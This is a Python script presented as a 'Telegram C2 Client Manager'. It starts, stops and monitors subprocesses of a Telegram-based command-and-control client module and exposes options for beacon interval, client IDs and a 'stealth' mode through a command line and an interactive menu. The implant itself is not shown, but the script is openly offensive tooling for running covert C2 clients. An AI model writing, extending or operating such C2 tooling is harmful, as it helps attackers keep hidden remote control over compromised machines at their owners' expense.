#!/usr/bin/env python3
"""
Telegram C2 Client Manager
"""

import json
import time
import platform
import subprocess
import threading
import argparse
import sys
import os
from datetime import datetime

class TelegramClientManager:
    def __init__(self):
        self.clients = {}
        self.running = False

    def get_available_clients(self):
        return {
            "basic": "telegram_c2.telegram_c2_client",
            "advanced": "telegram_c2.telegram_c2_client"
        }

    def start_client(self, client_type, client_id=None, stealth=False, beacon_interval=30):
        clients = self.get_available_clients()
        if client_type not in clients:
            print("Unknown client type: {}. Available: {}".format(client_type, list(clients.keys())))
            return False
        module_path = clients[client_type]
        cmd = ["python3", "-m", module_path]
        if client_id:
            cmd.extend(["--client-id", client_id])
        if beacon_interval != 30:
            cmd.extend(["--beacon-interval", str(beacon_interval)])
        if stealth:
            cmd.append("--stealth")
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.clients[client_type] = {
                "process": process,
                "client_id": client_id,
                "start_time": datetime.now(),
                "type": client_type
            }
            print("Started {} Telegram client with PID {}".format(client_type, process.pid))
            return True
        except Exception as e:
            print("Failed to start {} Telegram client: {}".format(client_type, e))
            return False

    def stop_client(self, client_type):
        if client_type not in self.clients:
            print("Client {} not running".format(client_type))
            return False
        try:
            process = self.clients[client_type]["process"]
            process.terminate()
            process.wait(timeout=5)
            del self.clients[client_type]
            print("Stopped {} client".format(client_type))
            return True
        except Exception as e:
            print("Failed to stop {} client: {}".format(client_type, e))
            return False

    def stop_all_clients(self):
        for client_type in list(self.clients.keys()):
            self.stop_client(client_type)

    def get_client_status(self):
        status = {}
        for client_type, client_info in self.clients.items():
            process = client_info["process"]
            status[client_type] = {
                "pid": process.pid,
                "running": process.poll() is None,
                "start_time": client_info["start_time"].isoformat(),
                "client_id": client_info["client_id"]
            }
        return status

    def interactive_mode(self):
        print("Telegram C2 Client Manager - Interactive Mode")
        print("=" * 50)
        while True:
            try:
                print("\nAvailable commands:")
                print("1. start <client_type> [client_id] [--stealth] [--interval N] - Start a client")
                print("2. stop <client_type> - Stop a client")
                print("3. status - Show client status")
                print("4. quit - Exit")
                command = input("\nEnter command: ").strip().split()
                if not command:
                    continue
                if command[0] == "quit":
                    break
                elif command[0] == "start":
                    if len(command) < 2:
                        print("Usage: start <client_type> [client_id] [--stealth] [--interval N]")
                        continue
                    client_type = command[1]
                    client_id = command[2] if len(command) > 2 and not command[2].startswith("--") else None
                    stealth = "--stealth" in command
                    beacon_interval = 30
                    for i, arg in enumerate(command):
                        if arg == "--interval" and i + 1 < len(command):
                            try:
                                beacon_interval = int(command[i + 1])
                            except ValueError:
                                pass
                    self.start_client(client_type, client_id, stealth, beacon_interval)
                elif command[0] == "stop":
                    if len(command) < 2:
                        print("Usage: stop <client_type>")
                        continue
                    self.stop_client(command[1])
                elif command[0] == "status":
                    status = self.get_client_status()
                    if status:
                        for client_type, info in status.items():
                            print("{}: PID {}, Running: {}, Started: {}".format(
                                client_type, info["pid"], info["running"], info["start_time"]
                            ))
                    else:
                        print("No clients running")
                else:
                    print("Unknown command: {}".format(command[0]))
            except KeyboardInterrupt:
                print("\nExiting...")
                break
            except Exception as e:
                print("Error: {}".format(e))
        self.stop_all_clients()

def main():
    parser = argparse.ArgumentParser(description="Telegram C2 Client Manager")
    parser.add_argument("--interactive", action="store_true", help="Start interactive mode")
    parser.add_argument("--start", help="Start a specific client type")
    parser.add_argument("--client-id", help="Client ID for starting client")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    parser.add_argument("--interval", type=int, default=30, help="Beacon interval in seconds")
    args = parser.parse_args()
    manager = TelegramClientManager()
    if args.interactive:
        manager.interactive_mode()
    elif args.start:
        manager.start_client(args.start, args.client_id, args.stealth, args.interval)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping client...")
            manager.stop_all_clients()
    else:
        print("Use --interactive for interactive mode or --start <client_type> to start a client")
        print("Available client types: basic, advanced")

if __name__ == "__main__":
    main()


